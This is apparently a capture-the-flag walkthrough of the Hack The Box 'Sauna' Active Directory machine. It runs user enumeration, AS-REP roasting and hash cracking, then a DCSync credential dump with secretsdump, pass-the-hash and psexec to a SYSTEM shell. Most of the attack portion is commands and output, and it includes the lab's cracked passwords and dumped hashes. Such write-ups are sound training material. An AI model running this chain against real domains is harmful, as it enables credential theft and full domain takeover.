@@ -1,0 +1,396 @@
+Active Directory Videos: Reel, Active. Sizzle, and Forest.
+Can't use rpc logic to check preauth required.
+
+First start with nmap scan. Based on scan results this is a domain controller.
+445 smb, 53 dns, 88 kerberos
+
+We know enumerate port 445 using crackmapexec:
+root@kali:~/htb/sauna# cme smb 10.10.10.175
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+
+We can also try and enumerate shares with username and password:
+root@kali:~/htb/sauna# cme smb 10.10.10.175 --shares -u '' -p ''
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\: STATUS_ACCESS_DENIED 
+SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED
+
+
+Not much is learned from this except for domain name: EGOTISTICAL-BANK.LOCAL
+
+We can also run smbmap but not much is learned.
+smbmap -H 10.10.10.175 -u '' -p ''
+[+] IP: 10.10.10.175:445        Name: 10.10.10.175
+
+We can also try to use rpcclient:
+rpcclient  10.10.10.175 -U ''
+rpcclient $> enumdomusers 
+result was NT_STATUS_ACCESS_DENIED
+
+Our access is denied.
+
+Next we go to the Web Browser and check out the page: looks like most pages are
+static html files.
+
+Could use cewl to try and grab user info. We can try to see if we can gather 
+possible usernames.
+
+If we go to the about page we will be able find possible usernames, we copy and 
+paste them to a separate file. we place into users.txt
+
+We can also use ldap to search for things: looks like most pages are
+static html files.
+
+COMMAND:
+============================================================================
+ldapsearch -x -h 10.10.10.175 -s base namingcontexts
+============================================================================
+OUTPUT:
+============================================================================
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
+namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+==========================================================================
+
+We want the dv name which is: DC=EGOTISTICAL-BANK,DC=LOCAL
+
+Again we can query ldap manualy with the registered name:
+COMMAND:
+=========================================================================
+ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub
+=========================================================================
+
+IMPORTANT: If we are lucky we could potentially find usernames by running the 
+above command. If we had the ability for anonymous ldap we would have the ability
+to read more about users.
+
+The user name in active directory is a sam account name could search for SAM.
+
+Using the users.txt we made. We will use vim macro to create a more robust 
+user list.
+
+Vim Macro Instructions:
+1. qa   // That means record the macro starting at 
+2. yy   // Yanks the current line
+2. 3p   //Places 3 lines of line previously yanked
+4. Hit home // so cursor is at the beginning
+5. "/" [space] [enter] s . [esc] // Searches and replaces the empty space with a .
+6. Hit down arrow [Home]-key 
+7. Right one and then dw // deletes the word after the cursor
+8. Go down one, hit [home]-key 
+9. right one dw, i . 
+10. hit down key and then [home] key, [esc] q // "q" is used to exit recording mode
+
+Now usa @a to replay all keys used in vim. Since we have 4 more lines we can use:
+4@a
+
+Now we can use a tool called kerbrute to do kerberos preauthentication attack against AD. If you have a valid username it says to please contine with preauth, if no 
+valid username it omits that. Can also brute force accounts. Cool thing is that no
+event code 624 will be generated. Can still lock accounts with a password spray.
+
+COMMAND:
+./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL users.txt
+OUTPUT:
+=========================================================================
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (1ad284a) - 11/14/20 - Ronnie Flathers @ropnop
+
+2020/11/14 00:04:07 >  Using KDC(s):
+2020/11/14 00:04:07 >   10.10.10.175:88
+
+2020/11/14 00:04:08 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
+2020/11/14 00:04:08 >  Done! Tested 24 usernames (1 valid) in 0.276 seconds
+=========================================================================
+
+We find a user FSmith. We will use impacket to gather more info.
+Locate imapcket directories.
+cd /usr/share/doc/python3-impacket/examples/
+
+We will need the GetNPUser.py will be the AS reproast, queries target domain:
+Queries target domain for users with 'Do not require Kerberos preauthentication'
+set and export their TGTs for cracking
+
+Due to issues with impacket had to create a virtuual environment to bypass 
+dependency issues on kali. Instruuctions are detailed below:
+COMMANDS:
+===========================================================================
+$ git clone https://github.com/SecureAuthCorp/impacket.git
+$ sudo apt install virtualenv
+$ virtualenv impacket-venv
+$ source impacket-venv/bin/activate
+(impacket-venv) $ cd ~/impacket
+(impacket-venv) impacket/$ pip3 install -r requirements.txt
+(impacket-venv) impacket/$ pip3 install .
+(impacket-venv) impacket/$ cd ~/impacket-venv/bin
+(impacket-venv) impacket-venv/bin/$ python3 ./GetADUsers.py
+===========================================================================
+
+Now we can get the hash for the fsmith user we found earlier by the following:
+Command:
+===========================================================================
+root@kali:~/htb/sauna/impacket-venv/bin# ./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith
+===========================================================================
+Output:
+===========================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Cannot authenticate fsmith, getting its TGT
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4f361c67b90f83e524c892e56d85f512$28fe9f5d921c9e93a0f21aa509016c2f23209077724b2af05c230f91eb28ebf5ccfd111a2bd27f9ce399b4917789563097a3e57350ff4ef0325a4622f35bc9e5a78a80b188d1d540c55fd9ced2d0cd194b8b78cba4a691978c5d4d9441467097dc30882214e93aa62b012e5e994aadc048c26a8f79567c16dc155ccbf3faf3b4333cd73d99841a783eee7fee645c8a99d137dede3f89496b57927d6bcbf057f0dc68c3868dcc9a4dc3d71b9b7aed0e66db2cd6488b2148ae59b60f7fa2ebd1f8dfd3e037e34f6818658ac0a83c7f533f41925a7987eca882d8fab7ae6eb710a87514d7575aded3c206e38639ee832c47b14d29ec914d03e6b9efb71773864d72
+root@kali:~/htb/sauna/impacket-venv/bin# ./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Cannot authenticate fsmith, getting its TGT
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4f361c67b90f83e524c892e56d85f512$28fe9f5d921c9e93a0f21aa509016c2f23209077724b2af05c230f91eb28ebf5ccfd111a2bd27f9ce399b4917789563097a3e57350ff4ef0325a4622f35bc9e5a78a80b188d1d540c55fd9ced2d0cd194b8b78cba4a691978c5d4d9441467097dc30882214e93aa62b012e5e994aadc048c26a8f79567c16dc155ccbf3faf3b4333cd73d99841a783eee7fee645c8a99d137dede3f89496b57927d6bcbf057f0dc68c3868dcc9a4dc3d71b9b7aed0e66db2cd6488b2148ae59b60f7fa2ebd1f8dfd3e037e34f6818658ac0a83c7f533f41925a7987eca882d8fab7ae6eb710a87514d7575aded3c206e38639ee832c47b14d29ec914d03e6b9efb71773864d72
+===========================================================================
+
+We now have the tgt and we can now crack it.
+hashcat --example-hashes | grep asrep
+HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5S
+
+hashcat --force -m 18200 hashes/sauna /usr/share/wordlists/rockyou.txt
+CRACKED HASH:
+============================================================================
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4f361c67b90f83e524c892e56d85f512$28fe9f5d921c9e93a0f21aa509016c2f23209077724b2af05c230f91eb28ebf5ccfd111a2bd27f9ce399b4917789563097a3e57350ff4ef0325a4622f35bc9e5a78a80b188d1d540c55fd9ced2d0cd194b8b78cba4a691978c5d4d9441467097dc30882214e93aa62b012e5e994aadc048c26a8f79567c16dc155ccbf3faf3b4333cd73d99841a783eee7fee645c8a99d137dede3f89496b57927d6bcbf057f0dc68c3868dcc9a4dc3d71b9b7aed0e66db2cd6488b2148ae59b60f7fa2ebd1f8dfd3e037e34f6818658ac0a83c7f533f41925a7987eca882d8fab7ae6eb710a87514d7575aded3c206e38639ee832c47b14d29ec914d03e6b9efb71773864d72:Thestrokes23
+============================================================================
+
+The password for fsmith is: Thestrokes23
+We can now use crackmapexec again and see the diferent ouutput:
+cme smb 10.10.10.175 -u fsmith -p Thestrokes23
+
+We can also enumerate the shares we have access with the user:
+cme smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares
+
+An interesting part shows that there is a printer as part of the shares:
+SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6                 We cant print money     
+
+We use winrm in conjunction with cme abd come to find we can indeed get a shell 
+on the box:
+COMMAND:
+================================================================================
+cme winrm 10.10.10.175 -u fsmith -p Thestrokes23
+================================================================================
+
+OUTPUT:
+================================================================================
+WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+WINRM       10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
+WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
+================================================================================
+
+We can now use evil-winrm to get on the box:
+COMMAND:
+================================================================================
+evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+================================================================================
+
+OUTPUT:
+================================================================================
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> 
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> 
+================================================================================
+
+We are now inside and we can now get the user.txt locate in the desktop directory.
+
+Next thing to do is use to use a privilege escalation script (winpeas) to gather
+more info on the system. 
+
+We then upload and winPEASx64.exe from out current shell and wait for the output, 
+in the meantime we look for ricoh exploits given what we found on the shares.
+
+Relevant web link with local privesc:
+https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/
+
+Apparently the ricoh default exploit directory does not exsist in machine:
+C:\>icacls "c:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\*.dll"
+
+We can use the following to list users:
+net user /domain
+
+We find a couple of users, one in particular is the svc_loanmgr. We can gain info:
+net user /domain svc_loanmgr
+
+OUTPUT:
+======================================================================
+Evil-WinRM* PS C:\Users\FSmith\Documents> net user /domain svc_loanmgr
+User name                    svc_loanmgr
+Full Name                    L Manager
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/24/2020 3:48:31 PM
+Password expires             Never
+Password changeable          1/25/2020 3:48:31 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+======================================================================
+
+With WinPeas we also find the credentials for the the svc_loanmgr use:
+OUTPUT:
+======================================================================
+  [+] Looking for AutoLogon credentials
+    Some AutoLogon credentials were found!!
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+======================================================================
+
+We can now login as that user.
+
+Will now switch to bloodhound since it is using active directory:
+apt install bloodhound -y
+
+Will also download ingestors from github directory:
+git clone https://github.com/BloodHoundAD/BloodHound.git
+
+Commands:
+======================================================================
+upload sharphound.exe
+neo4j console
+.\SharpHound.exe
+download 20201114185351_BloodHound.zip
+bloodhound
+======================================================================
+
+
+In the Pre-Built Analytics Queries on BloodHound, we look at the "Find Principals with DCSync
+Rights" and we are able to find something pecuuliar concerning the svc_loanmgr user.
+
+On bloodhound click on the edge and right click on "get Changes" and you will see a description
+of an attack.
+OUTPUT:
+======================================================================
+The user SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes privilege on the domain EGOTISTICAL-BANK.LOCAL.
+
+Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack.
+======================================================================
+
+We could potentially run mimikatz on the box, but instead we can use an impacket tool for that.
+secretsduump.py 
+
+COMMAND:
+======================================================================
+./secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
+======================================================================
+
+OUTPUT:
+======================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:9b1fb732d6ce013b3202b858446047d3:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
+Administrator:des-cbc-md5:19d5f15d689b1ce5
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:cbaaa30175115a1dd8f966dad520f33e62711dc46c35fa0500222fd199bc3399
+SAUNA$:aes128-cts-hmac-sha1-96:55ee10042cb55a357fe6ef73752babec
+SAUNA$:des-cbc-md5:104c515b86739e08
+[*] Cleaning up... 
+======================================================================
+
+Essentially what attack is, hey domain controller, I am another domain controller, lets sync
+up so give me your users password hashed. We can now do a pass the hash attack with crackmap.
+
+COMMAND:
+======================================================================
+cme smb  10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
+======================================================================
+
+OUTPUT:
+======================================================================
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\administrator d9485863c1e9e05851aa40cbb4ab9dff (Pwn3d!)
+======================================================================
+
+We can now do psexec using the admin user and passing its hash
+COMMAND:
+======================================================================
+./psexec.py EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
+======================================================================
+OUTPUT:
+======================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.175.....
+[*] Found writable share ADMIN$
+[*] Uploading file kOpGsXDS.exe
+[*] Opening SVCManager on 10.10.10.175.....
+[*] Creating service TJni on 10.10.10.175.....
+[*] Starting service TJni.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.973]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+======================================================================
+
+And that is how we get root user.
